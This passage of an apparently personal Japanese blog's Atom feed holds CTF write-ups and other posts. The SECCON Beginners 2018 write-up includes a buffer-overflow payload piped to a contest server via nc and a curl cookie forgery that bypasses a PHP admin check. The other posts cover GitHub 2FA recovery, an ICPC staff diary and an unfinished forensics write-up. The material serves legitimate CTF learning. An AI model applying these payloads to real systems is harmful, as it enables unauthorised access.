<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>alotofwe</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://suzupy.github.com/"/>
  <updated>2018-05-31T15:54:09.645Z</updated>
  <id>http://suzupy.github.com/</id>
  
  <author>
    <name>alotofwe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SECCON Beginners CTF 2018 Writeups</title>
    <link href="http://suzupy.github.com/seccon-beginners-ctf-2018/"/>
    <id>http://suzupy.github.com/seccon-beginners-ctf-2018/</id>
    <published>2018-05-30T06:20:35.000Z</published>
    <updated>2018-05-31T15:54:09.645Z</updated>
    
    <content type="html"><![CDATA[<p>Crypto 2, Pwn 1, Reversing 1, Web 1, Misc 3問で195位<br>以下、flagは直接表示せず解法のみ記載する</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Veni-vidi-vici"><a href="#Veni-vidi-vici" class="headerlink" title="Veni, vidi, vici"></a>Veni, vidi, vici</h2><p>text fileが3つ与えられる<br>part1はROT13, part2はROT8, part3は上下逆さに読む<br>1~3の結果を繋げるとflagとなる</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">% file part1</span><br><span class="line">part1: ASCII text</span><br><span class="line">% file part2</span><br><span class="line">part2: ASCII text</span><br><span class="line">% file part3</span><br><span class="line">part3: UTF-8 Unicode text</span><br><span class="line">% cat part1</span><br><span class="line">Gur svefg cneg bs gur synt vf: pgs4o&#123;a0zber</span><br><span class="line">% cat part2</span><br><span class="line">Lzw kwugfv hsjl gx lzw xdsy ak: _uDskk!usd_u</span><br><span class="line">% cat part3</span><br><span class="line">&#123;ʎɥdɐɹɓ0ʇdʎᴚ :sı ɓɐlɟ ǝɥʇ ɟo ʇɹɐd pɹıɥʇ ǝɥ⊥</span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>crypto1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot</span><span class="params">(n,s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> (<span class="number">65</span>, <span class="number">97</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">            d[chr(i+c)] = chr((i+n) % <span class="number">26</span> + c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([d.get(c, c) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">part1 = <span class="string">'Gur svefg cneg bs gur synt vf: pgs4o&#123;a0zber'</span></span><br><span class="line">part2 = <span class="string">'Lzw kwugfv hsjl gx lzw xdsy ak: _uDskk!usd_u'</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'----- part1 -----'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">25</span>):</span><br><span class="line">    print(str(i) + <span class="string">' : '</span> + rot(i,part1))</span><br><span class="line">print(<span class="string">'----- part2 -----'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">25</span>):</span><br><span class="line">    print(str(i) + <span class="string">' : '</span> + rot(i,part2))</span><br></pre></td></tr></table></figure><h2 id="RSA-is-Power"><a href="#RSA-is-Power" class="headerlink" title="RSA is Power"></a>RSA is Power</h2><p>RSAのN, E, Cが与えられる<br>Nを<a href="http://stdkmd.com/nrr/msieve_ja.htm" target="_blank" rel="noopener">Msieve</a>を用いて素因数分解し復号する</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">% ./msieve -q -v -e 97139961312384239075080721131188244842051515305572003521287545456189235939577</span><br><span class="line">Msieve v. 1.52 (SVN unknown)</span><br><span class="line">Sun May 27 12:28:20 2018</span><br><span class="line">random seeds: 6e686328 e437b032</span><br><span class="line">factoring 97139961312384239075080721131188244842051515305572003521287545456189235939577 (77 digits)</span><br><span class="line">searching <span class="keyword">for</span> 15-digit factors</span><br><span class="line">searching <span class="keyword">for</span> 20-digit factors</span><br><span class="line">commencing quadratic sieve (77-digit input)</span><br><span class="line">using multiplier of 17</span><br><span class="line">using generic 32kb sieve core</span><br><span class="line">sieve interval: 12 blocks of size 32768</span><br><span class="line">processing polynomials <span class="keyword">in</span> batches of 17</span><br><span class="line">using a sieve bound of 922619 (36471 primes)</span><br><span class="line">using large prime bound of 92261900 (26 bits)</span><br><span class="line">using trial factoring cutoff of 26 bits</span><br><span class="line">polynomial <span class="string">'A'</span> values have 10 factors</span><br><span class="line">restarting with 19257 full and 192162 partial relations</span><br><span class="line">36824 relations (19257 full + 17567 combined from 192162 partial), need 36567</span><br><span class="line">begin with 211419 relations</span><br><span class="line">reduce to 52152 relations <span class="keyword">in</span> 2 passes</span><br><span class="line">attempting to <span class="built_in">read</span> 52152 relations</span><br><span class="line">recovered 52152 relations</span><br><span class="line">recovered 40908 polynomials</span><br><span class="line">attempting to build 36824 cycles</span><br><span class="line">found 36824 cycles <span class="keyword">in</span> 1 passes</span><br><span class="line">distribution of cycle lengths:</span><br><span class="line">   length 1 : 19257</span><br><span class="line">   length 2 : 17567</span><br><span class="line">largest cycle: 2 relations</span><br><span class="line">matrix is 36471 x 36824 (5.3 MB) with weight 1107805 (30.08/col)</span><br><span class="line">sparse part has weight 1107805 (30.08/col)</span><br><span class="line">filtering completed <span class="keyword">in</span> 3 passes</span><br><span class="line">matrix is 25811 x 25874 (4.1 MB) with weight 862421 (33.33/col)</span><br><span class="line">sparse part has weight 862421 (33.33/col)</span><br><span class="line">saving the first 48 matrix rows <span class="keyword">for</span> later</span><br><span class="line">matrix includes 64 packed rows</span><br><span class="line">matrix is 25763 x 25874 (2.6 MB) with weight 618823 (23.92/col)</span><br><span class="line">sparse part has weight 423573 (16.37/col)</span><br><span class="line">commencing Lanczos iteration</span><br><span class="line">memory use: 2.6 MB</span><br><span class="line">lanczos halted after 409 iterations (dim = 25759)</span><br><span class="line">recovered 15 nontrivial dependencies</span><br><span class="line">prp39 factor: 299681192390656691733849646142066664329</span><br><span class="line">prp39 factor: 324144336644773773047359441106332937713</span><br><span class="line">elapsed time 00:00:12</span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>crypto2.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">97139961312384239075080721131188244842051515305572003521287545456189235939577</span></span><br><span class="line">p = <span class="number">299681192390656691733849646142066664329</span></span><br><span class="line">q = <span class="number">324144336644773773047359441106332937713</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">77361455127455996572404451221401510145575776233122006907198858022042920987316</span></span><br><span class="line"></span><br><span class="line">a = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> (a * x + <span class="number">1</span>) % e == <span class="number">0</span>:</span><br><span class="line">        d = (a * x + <span class="number">1</span>) / e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    x = x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">flag = (<span class="string">'%x'</span> % m).decode(<span class="string">'hex'</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="condition"><a href="#condition" class="headerlink" title="condition"></a>condition</h2><p>指定されたhost, portに接続すると名前を尋ねられる  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% nc pwn1.chall.beginners.seccon.jp 16268</span><br><span class="line">Please tell me your name...myname</span><br><span class="line">Permission denied</span><br></pre></td></tr></table></figure><p>実行ファイルが配布されており、objdumpで見るとmain文は以下の通り (-M intel)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000000000400771 &lt;main&gt;:</span><br><span class="line">  400771:55                   push   rbp</span><br><span class="line">  400772:48 89 e5             mov    rbp,rsp</span><br><span class="line">  400775:48 83 ec 30          sub    rsp,0x30</span><br><span class="line">  400779:c7 45 fc 00 00 00 00 mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">  400780:bf d8 08 40 00       mov    edi,0x4008d8</span><br><span class="line">  400785:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">  40078a:e8 71 fe ff ff       call   400600 &lt;printf@plt&gt;</span><br><span class="line">  40078f:48 8d 45 d0          lea    rax,[rbp-0x30]</span><br><span class="line">  400793:48 89 c7             mov    rdi,rax</span><br><span class="line">  400796:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">  40079b:e8 80 fe ff ff       call   400620 &lt;gets@plt&gt;</span><br><span class="line">  4007a0:81 7d fc ef be ad de cmp    DWORD PTR [rbp-0x4],0xdeadbeef</span><br><span class="line">  4007a7:75 16                jne    4007bf &lt;main+0x4e&gt;</span><br><span class="line">  4007a9:bf f8 08 40 00       mov    edi,0x4008f8</span><br><span class="line">  4007ae:e8 0d fe ff ff       call   4005c0 &lt;puts@plt&gt;</span><br><span class="line">  4007b3:bf 1e 09 40 00       mov    edi,0x40091e</span><br><span class="line">  4007b8:e8 16 00 00 00       call   4007d3 &lt;read_file&gt;</span><br><span class="line">  4007bd:eb 0a                jmp    4007c9 &lt;main+0x58&gt;</span><br><span class="line">  4007bf:bf 27 09 40 00       mov    edi,0x400927</span><br><span class="line">  4007c4:e8 f7 fd ff ff       call   4005c0 &lt;puts@plt&gt;</span><br><span class="line">  4007c9:bf 00 00 00 00       mov    edi,0x0</span><br><span class="line">  4007ce:e8 6d fe ff ff       call   400640 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>4007a0以降が重要で、0xdeadbeefとDWORD PTR [rbp-0x4]を比較し一致しなければ4007bfへjumpしている<br>認証成功すれば4007a7~4007bdを実行、そうでなければ4007bfへ飛ばされる</p><p>gdb-pedaでstep実行するとgetsで読み込んだ値はrspに保存されることが分かる<br>rbpとrspのアドレスは固定なので、DWORD PTR [rbp-0x4]が0xdeadbeefになるよう入力を生成して認証を突破する<br>リトルエンディアンに注意</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'a'*44+'\xef\xbe\xad\xde'"</span> | nc pwn1.chall.beginners.seccon.jp 16268</span><br></pre></td></tr></table></figure><h1 id="Simple-Auth"><a href="#Simple-Auth" class="headerlink" title="Simple Auth"></a>Simple Auth</h1><p>実行可能なファイルが渡される</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% simple_auth</span><br><span class="line">Input Password: mypassword</span><br><span class="line">Umm...Auth failed...</span><br></pre></td></tr></table></figure><p>objdumpするとauth functionにフラグが埋め込まれている</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">----- snip -----</span><br><span class="line"></span><br><span class="line">0000000000400686 &lt;auth&gt;:</span><br><span class="line">  400686:55                   push   rbp</span><br><span class="line">  400687:48 89 e5             mov    rbp,rsp</span><br><span class="line">  40068a:48 83 ec 50          sub    rsp,0x50</span><br><span class="line">  40068e:48 89 7d b8          mov    QWORD PTR [rbp-0x48],rdi</span><br><span class="line">  400692:64 48 8b 04 25 28 00 mov    rax,QWORD PTR fs:0x28</span><br><span class="line">  400699:00 00 </span><br><span class="line">  40069b:48 89 45 f8          mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">  40069f:31 c0                xor    eax,eax</span><br><span class="line">  4006a1:c7 45 c0 01 00 00 00 mov    DWORD PTR [rbp-0x40],0x1</span><br><span class="line">  4006a8:c6 45 d0 63          mov    BYTE PTR [rbp-0x30],0x63</span><br><span class="line">  4006ac:c6 45 d1 74          mov    BYTE PTR [rbp-0x2f],0x74</span><br><span class="line">  4006b0:c6 45 d2 66          mov    BYTE PTR [rbp-0x2e],0x66</span><br><span class="line">  4006b4:c6 45 d3 34          mov    BYTE PTR [rbp-0x2d],0x34</span><br><span class="line">  4006b8:c6 45 d4 62          mov    BYTE PTR [rbp-0x2c],0x62</span><br><span class="line">  4006bc:c6 45 d5 7b          mov    BYTE PTR [rbp-0x2b],0x7b</span><br><span class="line">  4006c0:c6 45 d6 72          mov    BYTE PTR [rbp-0x2a],0x72</span><br><span class="line">  4006c4:c6 45 d7 65          mov    BYTE PTR [rbp-0x29],0x65</span><br><span class="line">  4006c8:c6 45 d8 76          mov    BYTE PTR [rbp-0x28],0x76</span><br><span class="line">  4006cc:c6 45 d9 33          mov    BYTE PTR [rbp-0x27],0x33</span><br><span class="line">  4006d0:c6 45 da 72          mov    BYTE PTR [rbp-0x26],0x72</span><br><span class="line">  4006d4:c6 45 db 73          mov    BYTE PTR [rbp-0x25],0x73</span><br><span class="line">  4006d8:c6 45 dc 69          mov    BYTE PTR [rbp-0x24],0x69</span><br><span class="line">  4006dc:c6 45 dd 6e          mov    BYTE PTR [rbp-0x23],0x6e</span><br><span class="line">  4006e0:c6 45 de 67          mov    BYTE PTR [rbp-0x22],0x67</span><br><span class="line">  4006e4:c6 45 df 5f          mov    BYTE PTR [rbp-0x21],0x5f</span><br><span class="line">  4006e8:c6 45 e0 70          mov    BYTE PTR [rbp-0x20],0x70</span><br><span class="line">  4006ec:c6 45 e1 34          mov    BYTE PTR [rbp-0x1f],0x34</span><br><span class="line">  4006f0:c6 45 e2 73          mov    BYTE PTR [rbp-0x1e],0x73</span><br><span class="line">  4006f4:c6 45 e3 73          mov    BYTE PTR [rbp-0x1d],0x73</span><br><span class="line">  4006f8:c6 45 e4 77          mov    BYTE PTR [rbp-0x1c],0x77</span><br><span class="line">  4006fc:c6 45 e5 30          mov    BYTE PTR [rbp-0x1b],0x30</span><br><span class="line">  400700:c6 45 e6 72          mov    BYTE PTR [rbp-0x1a],0x72</span><br><span class="line">  400704:c6 45 e7 64          mov    BYTE PTR [rbp-0x19],0x64</span><br><span class="line">  400708:c6 45 e8 7d          mov    BYTE PTR [rbp-0x18],0x7d</span><br><span class="line">  40070c:48 8b 45 b8          mov    rax,QWORD PTR [rbp-0x48]</span><br><span class="line"></span><br><span class="line">----- snip -----</span><br></pre></td></tr></table></figure><h2 id="Greeting"><a href="#Greeting" class="headerlink" title="Greeting"></a>Greeting</h2><p>nameを入力するページと、そのページで動いているPHPのソースが与えられる<br><code>isset($_POST[&#39;name&#39;])</code>がfalseで<code>isset($_COOKIE[&#39;name&#39;])</code>がtrueになり、かつ$usernameのvalueがadminになればよい<br>curlでcookie name=adminを指定する</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% curl -sS --cookie <span class="string">'name=admin'</span>  http://greeting.chall.beginners.seccon.jp | grep ctf4b</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="plain-mail"><a href="#plain-mail" class="headerlink" title="plain mail"></a>plain mail</h2><p>pcap fileが与えられる<br>読むと1通目のメールにbase64エンコードされたzip file, 2通目にパスワードが書かれている<br>zip fileをデコードして解凍</p><figure class="highlight python"><figcaption><span>misc1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">print(base64.b64decode(<span class="string">''</span>.join(sys.argv[<span class="number">1</span>:])))</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% python misc1.py $(strings packet.pcap | grep -A4 base | tail -4) &gt; encrypted.zip</span><br><span class="line">% unzip -p _you_are_pro_ encrypted.zip</span><br></pre></td></tr></table></figure><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>フラグは公式IRCチャンネルのトピックにあります。</p><h2 id="てけいさんえくすとりーむず"><a href="#てけいさんえくすとりーむず" class="headerlink" title="てけいさんえくすとりーむず"></a>てけいさんえくすとりーむず</h2><p>てけいさんでは間に合わないため、式を受け取り計算して返すプログラムを書く</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((&apos;tekeisan-ekusutoriim.chall.beginners.seccon.jp&apos;, 8690))</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    response = s.recv(1024)</span><br><span class="line">    print(response)</span><br><span class="line">    if (&apos;=&apos; in response) is False:</span><br><span class="line">        break</span><br><span class="line">    expr = response.split(&apos;\n&apos;)[-1].replace(&apos; = &apos;, &apos;&apos;)</span><br><span class="line">    s.send(str(eval(expr)) + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Crypto 2, Pwn 1, Reversing 1, Web 1, Misc 3問で195位&lt;br&gt;以下、flagは直接表示せず解法のみ記載する&lt;/p&gt;
&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>GitHubの2段階認証をサポート経由で解除する</title>
    <link href="http://suzupy.github.com/disable-github-two-factor-auth/"/>
    <id>http://suzupy.github.com/disable-github-two-factor-auth/</id>
    <published>2018-02-09T02:16:02.000Z</published>
    <updated>2018-02-09T02:48:52.973Z</updated>
    
    <content type="html"><![CDATA[<p>2段階認証の数字が取得できなくなり、かつrecovery codesを紛失したときはSSH用秘密鍵さえあれば2段階認証の解除を要求することができる  </p><h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>GitHubとのSSH用秘密鍵が手元に残っている</p><h1 id="手順"><a href="#手順" class="headerlink" title="手順"></a>手順</h1><ol><li><a href="https://github.com/contact" target="_blank" rel="noopener">Contact GitHub</a>に発生している問題とverification tokenを連絡</li><li>サポートからのメールに返信</li><li>2段階認証解除を確認</li></ol><h1 id="Contact-GitHubに発生している問題を連絡"><a href="#Contact-GitHubに発生している問題を連絡" class="headerlink" title="Contact GitHubに発生している問題を連絡"></a>Contact GitHubに発生している問題を連絡</h1><p><a href="https://github.com/contact" target="_blank" rel="noopener">https://github.com/contact</a> のサポートフォームから</p><p>Name: 任意の名前<br>Email: サポートメールを受け取るアドレス<br>Subject: 「2段階認証を解除してくれ」という旨の英文<br>How can we help?: 「2段階認証の数字が取得でない, recovery codesも無いため認証解除してほしい」という旨の英文とverification token</p><p>を送信する</p><p>verification tokenは以下のコマンドで取得</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com verify</span><br><span class="line">Please provide the following verification token to GitHub Support.</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><h1 id="サポートからのメールに返信"><a href="#サポートからのメールに返信" class="headerlink" title="サポートからのメールに返信"></a>サポートからのメールに返信</h1><p>しばらく待つとEmailに入力したアドレスにサポートからのメールが届く<br>(今回の解除要求では1時間ほどで届いた)</p><blockquote><p>The quickest way to regain access to an account is by using the recovery codes we asked you to download when you enabled 2FA for your account. Even if you think you might not have them, it’s worth searching your computer and backups just to be sure; you’d be surprised how often these turn up! They would have had the default filename github-recovery-codes.txt or github_2fa_recovery_codes.txt.</p><p>If you definitely don’t have valid recovery codes, please let us know.</p><p>Thanks,</p></blockquote><p>How can we help?にrecovery codesが無いと書いてもこれが届いたため、おそらく内容に関わらず1度は探すよう要求するのだと思われる<br>しっかり探した上で見つからなかったので解除して欲しいと返信</p><h1 id="2段階認証解除を確認"><a href="#2段階認証解除を確認" class="headerlink" title="2段階認証解除を確認"></a>2段階認証解除を確認</h1><p>折り返し2段階認証を解除したという内容のメールが届くため、ログインして解除を確認する</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2段階認証の数字が取得できなくなり、かつrecovery codesを紛失したときはSSH用秘密鍵さえあれば2段階認証の解除を要求することができる  &lt;/p&gt;
&lt;h1 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ACM-ICPC 2017 Asia Tsukuba Regional</title>
    <link href="http://suzupy.github.com/acm-icpc-2017-asia-tsukuba-regional/"/>
    <id>http://suzupy.github.com/acm-icpc-2017-asia-tsukuba-regional/</id>
    <published>2017-12-20T14:42:15.000Z</published>
    <updated>2017-12-20T14:54:44.739Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://icpc.iisf.or.jp/2017-tsukuba/regional/" target="_blank" rel="noopener">https://icpc.iisf.or.jp/2017-tsukuba/regional/</a></p><p><a href="http://acm-icpc.aitea.net/" target="_blank" rel="noopener">JAG</a>のスタッフとして参加していた</p><h2 id="12-16"><a href="#12-16" class="headerlink" title="12/16"></a>12/16</h2><p>前日CTF for GIRLSに出ていたら妙に眠れず1.5時間睡眠になる<br>更にTXで酔って体調が最悪になる</p><p>会場到着。お手洗いで掃除の人に何が開催されるのか聞かれていたら集合に遅刻する<br>何も分からなくなったのでふらふらしていた、参加チームが座る椅子や風船を挿すポールを運んでいた気がする<br>午前はあまりできることがなかった</p><p>配布されたお弁当を食べる。周りにいた人々が静かなので落ち着く</p><p>午後さまよっていたら受付係になる。会場到着した参加チームを英語で案内する係<br>受付列の整理があまりうまくできず反省</p><p>受付が終わって休んでいたらプラクティスが始まり、風船やプリントを会場に運んだ<br>運搬係は3年前にやっていて慣れており特筆すべきことはなにもない<br>手が空いた時に会場をうろうろしていた</p><p>終わって選手と共に歓迎会でごはんを食べる。足が限界になりずっと座っていた  </p><h2 id="12-17"><a href="#12-17" class="headerlink" title="12/17"></a>12/17</h2><p>前日と同じく受付係をする。電子機器の持ち込みチェックが甘く反省<br>コンテスト開始前後は会場をうろうろしていた。開始前にUSB持ち込みが発見され回収</p><p>その後も適宜うろうろしたり運搬したりしていた。黄色と薄緑の風船の判別が難しい  </p><p>コンテスト終了後は急いで会場の撤収作業をする。スイッチを見ると社会にいた時のことを思い出すのか体調が悪くなってつらかった<br>作業が一段落ついたところで表彰を見に行く。Yes/Noおじさんという人がいるらしいが昔からいたのかよく分からない  </p><p>懇親会中は足が死んでいてほとんど外で座っていた<br>ごはんを少し食べ参加証明書を受け取り終わり</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://icpc.iisf.or.jp/2017-tsukuba/regional/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://icpc.iisf.or.jp/2017-tsukuba/regional/&lt;/a
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第8回 CTF for GIRLS 演習問題 Writeup</title>
    <link href="http://suzupy.github.com/ctf4g20171215/"/>
    <id>http://suzupy.github.com/ctf4g20171215/</id>
    <published>2017-12-18T13:09:58.000Z</published>
    <updated>2017-12-18T13:50:28.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="環境"><a href="#環境" class="headerlink" title="環境"></a>環境</h1><p><a href="env.png"><img src="env.png" alt="alt" title="env.png" width="700"></a></p><h1 id="初級問題1"><a href="#初級問題1" class="headerlink" title="初級問題1"></a>初級問題1</h1><h2 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h2><p>Disk Image <code>Alice.001</code> に含まれる削除済みファイルからflagを得る<br>ヒント: 削除されたファイルは My Documents/Letters/FromBob に保存されていた</p><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>AccessData FTK ImagerでAlice.001を開き My Documents/Letters/FromBob を見るとSecret.bmpが見つかる<br>適当なバイナリエディタでSecret.bmpを開くとflagが得られる</p><p><a href="1.png"><img src="1.png" alt="alt" title="1.png" width="700"></a></p><h1 id="初級問題2"><a href="#初級問題2" class="headerlink" title="初級問題2"></a>初級問題2</h1><h2 id="問題-1"><a href="#問題-1" class="headerlink" title="問題"></a>問題</h2><p>Downloads.rarの中からflagを得る</p><h2 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h2><p>Downloads.rarを解凍し、解凍先ディレクトリの代替データストリーム (ADS) を表示する<br>swt0006-024.jpg:Flag.txt:$DATAからflagが得られる</p><h2 id="補足"><a href="#補足" class="headerlink" title="補足"></a>補足</h2><p>ADSとはWindowsのファイルシステムNTFSで使われる、ファイルに紐付くメタデータのこと</p><p><a href="2.png"><img src="2.png" alt="alt" title="2.png" width="700"></a></p><h1 id="初級問題3"><a href="#初級問題3" class="headerlink" title="初級問題3"></a>初級問題3</h1><h2 id="問題-2"><a href="#問題-2" class="headerlink" title="問題"></a>問題</h2><p>.doc形式のファイルからflagを得る</p><h2 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h2><p>拡張子を.zipに変更しファイルを解凍する<br>解凍先ディレクトリ内のflag.txtからflagが得られる</p><h1 id="中級問題1"><a href="#中級問題1" class="headerlink" title="中級問題1"></a>中級問題1</h1><h2 id="問題-3"><a href="#問題-3" class="headerlink" 